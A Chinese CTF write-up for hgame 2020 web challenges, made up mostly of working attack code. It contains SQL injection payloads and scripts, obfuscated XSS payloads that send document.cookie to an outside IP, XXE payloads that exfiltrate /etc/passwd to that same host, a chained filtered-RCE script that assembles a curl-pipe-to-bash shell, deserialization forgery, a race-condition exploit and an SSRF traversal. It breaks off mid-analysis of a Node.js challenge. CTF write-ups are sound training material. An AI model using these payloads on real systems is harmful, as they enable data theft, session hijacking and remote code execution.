categories:
- 比赛
tags:
- ctf
- web
- wp
title:  2020hgame
---
# 2020hgame

## web

###  Cosmos 的博客

> 不过有大茄子告诉我的**版本管理工具**以及 GitHub，我改起来也挺方便的。 

根据提示下载.git

```bash
$ git remote -v
#查看git
```

查看提交历史拿到flag

### 街头霸王

考察对http的了解

```
GET / HTTP/1.1
Host: kyaru.hgame.n3ko.co
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Cosmos Brower
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
referer: https://vidar.club/ 
x-forwarded-for: 127.0.0.1
If-Unmodified-Since: Fri, 02 Jan 2077 00:00:00 GMT
Connection: close


```

### code world

burp拦截

修改GET为post

### 鸡你太美

拦截ajax请求,修改分数



###  Cosmos的博客后台

```php
<?php
include "config.php";
session_start();

//Only for debug
if (DEBUG_MODE){
    if(isset($_GET['debug'])) {
        $debug = $_GET['debug'];
        if (!preg_match("/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/", $debug)) {
            die("args error!");
        }
        eval("var_dump($$debug);");
    }
}

if(isset($_SESSION['username'])) {
    header("Location: admin.php");
    exit();
}
else {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        if ($admin_password == md5($_POST['password']) && $_POST['username'] === $admin_username){
            $_SESSION['username'] = $_POST['username'];
            header("Location: admin.php");
            exit();
        }
        else {
            echo "ç¨æ·åæå¯ç éè¯¯";
        }
    }
}
?>

```



adminpassword: 0e114902927253523756713132279690 

密码使用==来进行md5校验,找个0e开头的密码即可绕过(QNKCDZO)

adminusername: Cosmos! 



index.php

```php
<?php
error_reporting(0);
session_start();

if(isset($_SESSION['username'])) {
    header("Location: admin.php");
    exit();
}

$action = @$_GET['action'];
$filter = "/config|etc|flag/i";

if (isset($_GET['action']) && !empty($_GET['action'])) {
    if(preg_match($filter, $_GET['action'])) {
        echo "Hacker get out!";
        exit();
    }
        include $action;
}
elseif(!isset($_GET['action']) || empty($_GET['action'])) {
    header("Location: ?action=login.php");
    exit();
}
```



admin.php

```php
<?php
include "config.php";
session_start();
if(!isset($_SESSION['username'])) {
    header('Location: index.php');
    exit();
}

function insert_img() {
    if (isset($_POST['img_url'])) {
        $img_url = @$_POST['img_url'];
        $url_array = parse_url($img_url);
        if (@$url_array['host'] !== "localhost" && $url_array['host'] !== "timgsa.baidu.com") {
            return false;
        }   
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $img_url);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        $res = curl_exec($c);
        curl_close($c);
        $avatar = base64_encode($res);

        if(filter_var($img_url, FILTER_VALIDATE_URL)) {
            return $avatar;
        }
    }
    else {
        return base64_encode(file_get_contents("static/logo.png"));
    }
}
?>

<?php echo insert_img() ? insert_img() : base64_encode(file_get_contents("static/error.jpg")); ?>'>

```

file%3A%2F%2Flocalhost%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag



hgame{pHp_1s_Th3_B3sT_L4nGu4gE!@!}



###  Cosmos的留言板-1

单引号闭合

过滤:select

黑名单:空格

```
0'/**/union/**/select/**/group_concat(schema_name)/**/FROM/**/information_schema.schemata#
information_schema,easysql
0'/**/union/**/select/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/TABLE_SCHEMA=database();#
f1aggggggggggggg,messages#
GROUP_CONCAT(column_name)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name/**/=/**/'f1aggggggggggggg'
fl4444444g

hgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}
```



###  Cosmos的新语言

php

```php
<?php

// function encrypt($str){
//     $result = '';
//     for($i = 0; $i < strlen($str); $i++){
//         $result .= chr(ord($str[$i]) + 1);
//     }
//     return $result;
// }
function encrypt($str)
{
    $result = '';
    for($i = 0; $i < strlen($str); $i++){
        $result .= chr(ord($str[$i]) - 1);
    }
    return $result;
}
$newcmd='$_POST[\'token\']';
$cmd=substr($_POST['cmd'],0,strlen($_POST['cmd'])-1);
preg_match("/^.*\(/U",$cmd,$arr);
$cmd=substr($cmd,strlen($arr[0]),strlen($cmd)-strlen($arr[0])-1);

while($cmd!=='$_SERVER[\'token\']')
{
    $arr=array();
    preg_match("/^.*\(/U",$cmd,$arr);
    $newcmd=$arr[0].$newcmd.")";    
    $cmd=substr($cmd,strlen($arr[0]),strlen($cmd)-strlen($arr[0])-1);

}

$cmd=(str_replace("base64_encode","base64_decode",$newcmd));    


$dec=eval("echo ".$cmd.";");
?>
```

python 

```python
import requests
def get_flag():
    enccmd=requests.get("http://4211e914b2.php.hgame.n3ko.co/mycode").text[159:]
    enccmd=enccmd[:len(enccmd)-75]
    html=requests.get("http://4211e914b2.php.hgame.n3ko.co/").text[626:]
    enc=html[:html.find("<br>")]
    data={"token":enc,"cmd":enccmd}
    dec=requests.post("http://127.0.0.1/",data=data).text
    data={"token":dec}
    print(requests.post("http://4211e914b2.php.hgame.n3ko.co/",data=data,proxies={"http":"http://127.0.0.1:8080"}).text[626:])

get_flag()
```



###  Cosmos的聊天室 

```html
<svg/onload="[]['\155\141\160']['\143\157\156\163\164\162\165\143\164\157\162']('\144\157\143\165\155\145\156\164\56\154\157\143\141\164\151\157\156\75\47\150\164\164\160\72\57\57\63\71\56\61\60\70\56\61\66\64\56\62\61\71\72\66\60\60\60\65\57\77\47\53\144\157\143\165\155\145\156\164\56\143\157\157\153\151\145')()" aa=
```

输入会变成大写



###  序列之争 - Ordinal Scale

这一题要让`$_SESSION['rank']===1`时,有flag

而默认的逻辑是没法实现的

```php
		if($this->rank <= 2){
                $this->rank = 2;
            }
```



阅读代码发现反序列化点:

`Monster`的`__construct`方法

```php
public function __construct($key){
        $this->encryptKey = $key;
        if(!isset($_COOKIE['monster'])){
            $this->Set();
            return;
        }

        $monsterData = base64_decode($_COOKIE['monster']);
        if(strlen($monsterData) > 32){
            $sign = substr($monsterData, -32);
            $monsterData = substr($monsterData, 0, strlen($monsterData) - 32);
            if(md5($monsterData . $this->encryptKey) === $sign){
                $this->monsterData = unserialize($monsterData);
            }else{
                session_start();
                session_destroy();
                setcookie('monster', '');
                header('Location: index.php');
                exit;
            }
        }
        
        $this->Set();     
    }
```



但是要知道`$key`才能反序列化

在`Game`的`__construct`方法中看到格式化字符串漏洞泄露`$key`

```php

class Game
{   
    private $encryptKey = 'gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL';
    public $welcomeMsg = '%s, Welcome to Ordinal Scale!';

    private $sign = '';
    public $rank;
//secret:gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL
    public function __construct($playerName){
        $_SESSION['player'] = $playerName;
        if(!isset($_SESSION['exp'])){
            $_SESSION['exp'] = 0;
        }
        $data = [$playerName, $this->encryptKey];
        $this->init($data);//set sign
        $this->monster = new Monster($this->sign);
        $this->rank = new Rank();
    }

    private function init($data){
        foreach($data as $key => $value){
            $this->welcomeMsg = sprintf($this->welcomeMsg, $value);
            $this->sign .= md5($this->sign . $value);
        }
    }
}
```

可以反序列化后,我们发现`Fight`的`__destruct`方法可以修改`$_SESSION['rank']`

```php
public function __destruct(){
        // 确保程序是跑在服务器上的！
        $this->serverKey = $_SERVER['key'];
        if($this->key === $this->serverKey){
            $_SESSION['rank'] = $this->rank;
        }else{
            // 非正常访问
            session_start();
            session_destroy();
            setcookie('monster', '');
            header('Location: index.php');
            exit;
        }
    }
```

但是还有`$this->key === $this->serverKey`阻挠这我们

如果我们能获得或修改`$_SERVER['key']`,便可以拿到flag了

php反序列化有个特性,反序列化时,若对象没有某个值,便会恢复成该对象对应的类的默认值

如:

```php
<?php
class test{
    public $my_static = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';
    public function __destruct()
    {
        echo $this->my_static;
    }

}
class tesa{

}
$a=str_replace("tesa","test",serialize(new tesa()));
unserialize($a);


结果:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```



于是构造

```php
<?php
class Game
{
    private $encryptKey = 'gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL';
    public $welcomeMsg = '%s, Welcome to Ordinal Scale!';

    public $sign = '';
    public $rank;
//secret:gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL
    public function __construct($playerName){
        $_SESSION['player'] = $playerName;
        if(!isset($_SESSION['exp'])){
            $_SESSION['exp'] = 0;
        }
        $data = [$playerName, $this->encryptKey];
        $this->init($data);//set sign
    }

    private function init($data){
        foreach($data as $key => $value){
            $this->welcomeMsg = sprintf($this->welcomeMsg, $value);
            $this->sign .= md5($this->sign . $value);
        }
    }
}
class Rank
{
    private $rank;
//    private $serverKey;     // 服务器的 Key
//    private $key;

    public function __construct()
    {
        $this->rank=1;
    }

    public function __destruct(){

    }
}
$s=new Rank();
//$s=array('name'=>'蔡建斌','no'=>999999999999999999);
$a=new Game($_GET['name']);
$sign = md5(serialize($s) . $a->sign);
print( base64_encode(serialize($s) . $sign));
?>

```



### 二发入魂

刚看到这题时是有点懵的,网页的图片是妙蛙种子,是想说交种子上去,但我没看懂/////



前一段时间爆出来的mt_srand逆向刚好可以用到

 https://github.com/ambionics/mt_rand-reverse 

```php
import requests
import os

burp0_url = "https://twoshot.hgame.n3ko.co:443/random.php?times=230"
burp0_cookies = {"PHPSESSID": "quh0vrim4vv8p4mnro1migluh3"}
burp0_headers = {"Connection": "close", "Accept": "*/*", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Referer": "https://twoshot.hgame.n3ko.co/", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"}
result=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies).text

a=eval(result)
p = os.popen("python reverse_mt_rand.py %d %d 0 0" % (a[0],a[227]) )
x=p.read().strip()

burp0_url = "https://twoshot.hgame.n3ko.co:443/verify.php"
burp0_cookies = {"PHPSESSID": "quh0vrim4vv8p4mnro1migluh3"}
burp0_headers = {"Connection": "close", "Accept": "*/*", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://twoshot.hgame.n3ko.co", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Referer": "https://twoshot.hgame.n3ko.co/", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"}
burp0_data = {"ans": x}
print(burp0_data)
result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text
print(result)

```



###  Cosmos的二手市场

#### 解法一

弱密码登陆别人账号,直接抄作业

admin,123456

#### 解法二

条件竞争

在一次偶然的爆破中我发现,商品的数量多了,于是便猜测有条件竞争漏洞

我来模拟以下造成条件竞争漏洞的原因

首先猜测以下solve和buy方法的流程

```php
function solve()
{
    #1. $num=从数据库中查找要用户持有的卖出商品的个数
    #2. 如果数量足够,则进行下一步,否则返回并报错
    #3. 在数据库中增加用户账户里的钱
    #4. 在数据库中减少用户拥有该商品的数量
}
```

假设web服务器在相差一个步骤的时间时收到两个请求,此时fork出两个进程a,b,设此时商品数量为1,两个请求要卖出的数量也都为1

1. a 执行完步骤1(`$num=1`);b刚要开始执行步骤1
2. a执行完步骤二;b执行完步骤一(`$num=1`)
3. a执行步骤三,用户账户里的钱增加了;b执行完步骤二,b进程也满足条件
4. a执行步骤四,此时数据库中商品的数量为0,b执行完步骤三,用户账户里的钱增加了
5. a进程结束;b进程试图减少数据库中商品的数量,但是数量最小为0,操作失败
6. b进程结束

于是我们可以看到最终结果是,用户用1单位的商品卖出了两个单位商品的价钱(1个商品被卖了两次)

为啥会这样,这是同时操作一个数据导致的bug,这也是为啥计算机里经常出现锁这个名称的原因,给数据上锁,避免两个进程同时操作一个数据,导致bug

刷钱脚本

```python
from multiprocessing import Pool
import requests
def buy(num,loop=3):

    for i in range(loop):
        burp0_url = "http://121.36.88.65:9999/API/?method=buy"
        burp0_cookies = {"PHPSESSID": "gd44lbha3t9ltc1cgng5c755ni"}
        burp0_headers = {"Pragma": "no-cache", "Cache-Control": "no-cache", "Accept": "*/*", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "http://121.36.88.65:9999", "Referer": "http://121.36.88.65:9999/market.html", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
        burp0_data = {"code": "800001", "amount": num}
        result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text
        if "success" in result:
            print("successfully buy %d items" % num)


def solve(num,loop=3):

    for i in range(loop):
        burp0_url = "http://121.36.88.65:9999/API/?method=solve"
        burp0_cookies = {"PHPSESSID": "gd44lbha3t9ltc1cgng5c755ni"}
        burp0_headers = {"Pragma": "no-cache", "Cache-Control": "no-cache", "Accept": "*/*", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "http://121.36.88.65:9999", "Referer": "http://121.36.88.65:9999/market.html", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
        burp0_data = {"code": "800001", "amount": num}
        result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text
        if "success" in result:
            print("successfully solve %d items" % num)

if __name__=='__main__':
    i=0
    while True:
        p = Pool(100)
        num=500
        for i in range(100):
            p.apply_async(buy, args=(num,))
        print('Waiting for all buy subprocesses done...')
        p.close()
        p.join()
        print('All subprocesses done.')

        p = Pool(100)

        for i in range(100):
            p.apply_async(solve, args=(num,))
        print('Waiting for all solve subprocesses done...')
        p.close()
        p.join()
        print('All subprocesses done.')
    
```



### 留言板

注册登陆的黑名单

```python
allow: ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 
'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '_', '\n']
disable: ['!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '`', '{', '|', '}', '~', ' ', '\t', '\r', '\x0b', '\x0c']
```

一个个检测输入点发现,delete方法存在sql注入

注入脚本

```python
import requests
from bs4 import BeautifulSoup
def send():

    burp0_url = "http://139.199.182.61:19999/index.php?method=send"
    burp0_cookies = {"PHPSESSID": "ab5fgepp50bnaenppkju4md4qs"}
    burp0_headers = {"Cache-Control": "max-age=0", "Origin": "http://139.199.182.61:19999", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://139.199.182.61:19999/index.php", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
    burp0_data = {"message": "aaa"}
    res=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    if res.status_code==200:
        return 1
    else :
        return 0

def get_id():


    burp0_url = "http://139.199.182.61:19999/index.php?message=aaa"
    burp0_cookies = {"PHPSESSID": "ab5fgepp50bnaenppkju4md4qs"}
    burp0_headers = {"Cache-Control": "max-age=0", "Origin": "http://139.199.182.61:19999", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://139.199.182.61:19999/index.php", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
    res=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    html = res.text
    try :
        soup = BeautifulSoup(html,'html.parser') #把网页解析为BeautifulSoup对象
        url=soup.find("span",class_="message").find("a")['href']
    except:
        return False
    return url.replace("index.php?method=delete&delete_id=","")

    
def check(mesid):
    burp0_url = "http://139.199.182.61:19999/index.php?message=aaa"
    burp0_cookies = {"PHPSESSID": "ab5fgepp50bnaenppkju4md4qs"}
    burp0_headers = {"Cache-Control": "max-age=0", "Origin": "http://139.199.182.61:19999", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://139.199.182.61:19999/index.php", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
    res=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    url="index.php?method=delete&delete_id="+str(mesid)
    if url in res.text:
        return True
    return False
#index.php?method=delete&delete_id=6594

def delete(mesid):
    burp0_url = "http://139.199.182.61:19999/index.php"
    burp0_cookies = {"PHPSESSID": "ab5fgepp50bnaenppkju4md4qs"}
    burp0_headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://139.199.182.61:19999/index.php", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
    requests.get(burp0_url, params={"method":"delete","delete_id":mesid},headers=burp0_headers, cookies=burp0_cookies)


def sql_inj(sql):
    mesid=get_id()
    delete(str(mesid)+" and ("+sql+") #")
    if not check(mesid):
        print("%s success" % sql)
        send()
        return True
    print("%s fail" % sql)
    return False

# sql_inj("(select substr(hex('1'),1,1))='3'")
cha="0123456789ABCDEF"
result=""
p=0
while True:
    p+=1
    temp=''
    for i in cha:
        if sql_inj("(select substr(hex(group_concat(name,',',password)),%d,1) FROM user where id=1)='%s'" % (p,i) ):
            result+=i
            temp=i
            print(result)
            break
    if temp!=result[-1]:
        break

#information_schema,babysql
#messages,user
#id,name,password

```



###  Cosmos的聊天室2.0

操操操,这题对我有毒,我这里不显示csp,导致我卡了很久


存在csp:

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

先检测一下

 https://csp-evaluator.withgoogle.com/ 

![image19320](https://i.loli.net/2020/02/06/xmcQvbWV7EXRisq.png)



说object-src不安全

这个策略已经ban掉了内联脚本,所以我们直接传一个js代码过去没用

我们对send方法进行检测发现,会过滤script,但是用双写就可以绕过,还会把大写转成小写

用burp代理,查看发送的请求,我们可以会注意到`/send`会直接返回我们发送的内容,利用这个恰好可以绕过`script-src 'self'` ,

我们发送以下payload(用script标签也一样)

```
<iframe src="send?message=%3c%73%76%67%20%6f%6e%6c%6f%61%64%3d%22%61%6c%65%72%74%28%29%22%3e"></iframe>
```

成功弹窗,但是我们还有`default-src 'self'`阻碍着我们带回数据

因为没有设置`object-src`我们可以用`embed `标签带回数据

最后的payload


```
<iframe src="send?message=<body><scscrscriptiptript>
var+iframe+%3d+eval(%22document.create\105lement('embed')%22)%3b
iframe.src%3d%22http%3a//39.108.164.219%3a60005/%3f%22%2bdocument.cookie%3b
eval(%22document.body.append\103hild(iframe)%22)%3b</scrscrscriptiptipt></body>"></iframe>
```



` hgame{1ts_@_$impL3_CSP_bYp4ss1ng_Ch@!!enge.} `



### 代打出题人服务中心

一看就知道有xxe漏洞

```
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://39.108.164.219:60005/evil.xml">
%sp;
%param1;
]>
<r>&exfil;</r>

File stored on http://39.108.164.219/evil.xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://39.108.164.219:60005/?a=%data;'>">
```



submit.php

```php
<?php
include "config.php";
$result = null;
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');

try{
    $stmt = $conn->prepare("INSERT INTO info (id, chal_name, bd_level, bd_time) VALUES (:id, :chal_name, :bd_level, :bd_time)");
    $stmt->bindParam(':id', $id);
    $stmt->bindParam(':chal_name', $chal_name);
    $stmt->bindParam(':bd_level', $level);
    $stmt->bindParam(':bd_time', $level);

    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    $creds = simplexml_import_dom($dom);
    $id = $creds->id;
    $chal_name = $creds->name;
    $level = $creds->level;
    $time = $creds->time;
    if ($id == "" || $level == "" || $chal_name == ""|| $time == "") {
        $result = sprintf("<result><code>%d</code><msg>%s</msg></result>",0,"请填写信息！");
        die($result);
    }
    $stmt->execute();
    $result = sprintf("<result><code>%d</code><msg>%s</msg></result>",1,"已提交成功，正在为您安排打手");
}catch(Exception $e){
    $result = sprintf("<result><code>%d</code><msg>%s</msg></result>",0,"提交失败！");
}
header('Content-Type: text/html; charset=utf-8');
echo $result;
?>
```







config.php

```php
<?php
$dbms='mysql';
$host='localhost';
$dbName='bdctr_message';
$user='root';
$pass='yevi1gcqpqHSaOZVDI1CcRLaHHSJ5BYgImof';

$dsn="$dbms:host=$host;dbname=$dbName";
$conn = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT => true));
$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

?>
```

原本想着用gopher执行sql语句,但是有密码无法执行

我我我我是个dsb,明明知道可能是内网有可能由其他主机,但就是不试一下





```
IP address       HW type     Flags       HW address            Mask     Device
172.21.0.5       0x1         0x0         00:00:00:00:00:00     *        eth0
172.21.0.1       0x1         0x2         02:42:f7:6e:6f:34     *        eth0
172.21.0.6       0x1         0x0         00:00:00:00:00:00     *        eth0
172.21.0.2       0x1         0x0         00:00:00:00:00:00     *        eth0
172.21.0.32      0x1         0x0         00:00:00:00:00:00     *        eth0
172.21.0.75      0x1         0x0         00:00:00:00:00:00     *        eth0
172.21.0.7       0x1         0x0         00:00:00:00:00:00     *        eth0
172.21.0.76      0x1         0x2         02:42:ac:15:00:4c     *        eth0
172.21.0.30      0x1         0x0         00:00:00:00:00:00     *        eth0
172.21.0.77      0x1         0x0         00:00:00:00:00:00     *        eth0

```

```
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.21.0.76	hgame-private
172.21.0.31	f9f1b9b99e13
```

发现一个内网服务器`172.21.0.76`

当尝试访问80端口时,发现文件太大等一系列问题

>使用libxml读取文件时,文件不能太大否则会报错

于是尝试压缩能不能读取

```
<?php
	error_reporting(0);
	file_put_contents("tmp",base64_decode(str_replace(' ','+',$_GET['a'])));
	$a=file_get_contents("php://filter/read=zlib.inflate/resource=tmp");
	file_put_contents("mes/".date("h_m_s").".txt",$a);
?>

```



```
<!ENTITY % data SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=http://172.21.0.76">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://39.108.164.219:60005/?a=%data;'>">
```



```php
<?php
error_reporting(0);

$token = @$_GET['token'];
if (!isset($token)) {
    die("请带上您的队伍token访问! /?token=");
}
$api = "http://checker/?token=".$token;
$t = file_get_contents($api);
if($t !== "ok") {
    die("队伍token错误");
}

highlight_file(__FILE__);

$sandbox = '/var/www/html/sandbox/'. md5("hgame2020" . $token);;
@mkdir($sandbox);
@chdir($sandbox);

$content = $_GET['v'];
if (isset($content)) {
    $cmd = substr($content,0,5);
    system($cmd);
}else if (isset($_GET['r'])) {
    system('rm -rf ./*');
}

/*   _____ _    _ ______ _      _        _____ ______ _______   _____ _______   _
  / ____| |  | |  ____| |    | |      / ____|  ____|__   __| |_   _|__   __| | |
 | (___ | |__| | |__  | |    | |     | |  __| |__     | |      | |    | |    | |
  \___ \|  __  |  __| | |    | |     | | |_ |  __|    | |      | |    | |    | |
  ____) | |  | | |____| |____| |____ | |__| | |____   | |     _| |_   | |    |_|
 |_____/|_|  |_|______|______|______( )_____|______|  |_|    |_____|  |_|    (_)
                                    |/

*/
```



然后利用 [https://err0rzz.github.io/2017/11/13/ctf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/](https://err0rzz.github.io/2017/11/13/ctf命令执行与绕过/) 

的方法来执行命令

```php

<?php
    $a=file_get_contents("tmp.xml");
    $command=array(
    '>ls\\\\', 
    'ls>_', 
    '>\\ \\\\', 
    '>-t\\\\', 
    '>\\>g', 
    'ls>>_',

    ">bash",
    ">\\|\\\\",
    ">5\\\\",
    ">00\\\\",
    ">60\\\\",
    ">9:\\\\",
    ">21\\\\",
    ">4.\\\\",
    ">16\\\\",
    ">8.\\\\",
    ">10\\\\",
    ">9.\\\\",
    ">3\\\\",
    ">\\ \\\\",
    ">rl\\\\",
    ">cu\\\\"
    );
    foreach($command as $v)
    {
        echo $v."\n";
        $v=urlencode($v);
        file_put_contents("evil.xml",str_replace("TGT",$v,$a));
        $postdata=<<<MRK
<?xml version="1.0" ?>
<!DOCTYPE msg [
<!ELEMENT msg ANY >
<!ENTITY % sp SYSTEM "http://39.108.164.219:60005/evil.xml">
%sp;
%param1;
]>
<msg><id>&exfil;</id><name>b</name><level>c</level><time>d</time></msg>
MRK;
        $opts = array('http' => 
        array( 'method'  => 'POST',
        'header'  => 'Content-type: application/x-www-form-urlencoded',
        'content' => $postdata ) 
    );
        $context = stream_context_create($opts);
        file_get_contents("http://bdctr.hgame.day-day.work/submit.php", false, $context);
        
    }


?>

```



在经历一次rm -rf 之后,终于拿到getshell

![image26112](https://i.loli.net/2020/02/17/IDFPmldJKNhEHt7.png)









`hgame{XxE!@SsrF_4nD_f1lt3rEd_Rc3_1s_Co0l!}`



### sekiro

刚拿到题目的时候,我心态被第一题搞崩了,随便看了一下,就溜去打游戏了,看了wp,艹



拿到题目,是我不熟悉的nodejs

影响不大,看个大概就会了

`\route\index.js`

```javascript
router.post('/action', function (req, res) {
  if (!req.session.sekiro) {
    res.end("Session required.")
  }
  if (!req.session.sekiro.alive) {
    res.end("You dead.")
  }
  var body = JSON.parse(JSON.stringify(req.body));//原型链污染起点
  var copybody = clone(body)
  if (copybody.solution) {
    req.session.sekiro = Game.dealWithAttacks(req.session.sekiro, copybody.solution)
  }
  res.end("提交成功"+JSON.stringify(req.body))
})
```



在注释处有一个奇怪的操作,转成json再转成解析成obj

这摆明了有问题,遇到`JSON.parse+merge` ,思路可以往原型链污染上走一走

我们继续阅读代码

跟进dealWithAttacks

```javascript
this.dealWithAttacks = function (sekiro, solution) {
        if (sekiro.attackInfo.solution !== solution) {
            sekiro.health -= sekiro.attackInfo.attack
            if (sekiro.attackInfo.additionalEffect) {
                var fn = Function("sekiro", sekiro.attackInfo.additionalEffect + "\nreturn sekiro")
                sekiro = fn(sekiro)//look this
            }
        }
        sekiro.posture = (sekiro.posture <= 500) ? sekiro.posture : 500
        sekiro.health = (sekiro.health > 0) ? sekiro.health : 0
        if (sekiro.posture == 500 || sekiro.health == 0) {
            sekiro.alive = false
        }
        return sekiro
    }
```



```javascript
var fn = Function("sekiro", sekiro.attackInfo.additionalEffect + "\nreturn sekiro")
                sekiro = fn(sekiro)
```

明显的代码执行,如果我们能控制`sekiro.attackInfo.additionalEffect`,那么便可以执行任意代码了

我们看一下`sekiro.attackInfo.additionalEffect `是如何获得的

```javascript
this.attacks = [
        {
            "method": "连续砍击",
            "attack": 1000,
            "additionalEffect": "sekiro.posture+=100",
            "solution": "连续格挡"
        },
        {
            "method": "普通攻击",
            "attack": 500,
            "additionalEffect": "sekiro.posture+=50",
            "solution": "格挡"
        },
        {
            "method": "下段攻击",
            "attack": 1000,
            "solution": "跳跃踩头"
        },
        {
            "method": "突刺攻击",
            "attack": 1000,
            "solution": "识破"
        },
        {
            "method": "巴之雷",
            "attack": 1000,
            "solution": "雷反"
        },
    ]
    this.getAttackInfo = function () {
        return this.attacks[Math.floor(Math.random() * this.attacks.length)]
    }
```

